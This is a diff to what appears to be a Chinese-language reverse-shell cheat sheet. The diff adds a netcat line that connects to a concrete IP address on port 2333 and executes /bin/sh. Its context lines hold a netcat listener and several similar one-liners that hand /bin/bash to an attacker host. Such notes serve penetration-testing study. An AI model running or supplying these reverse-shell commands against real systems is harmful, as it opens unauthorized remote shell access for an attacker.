@@ -43,6 +43,7 @@ nc -lvvp 2333
 netcat 47.xxx.xxx.72 2333 -e /bin/bash
 nc <攻击机IP> <攻击机监听的端口> -e /bin/bash
 nc 1.92.88.247 2333  -e /bin/bash
+nc 1.92.88.247 2333  -e /bin/sh
 ```
 
 ## **0x03.利用Bash反弹shell**
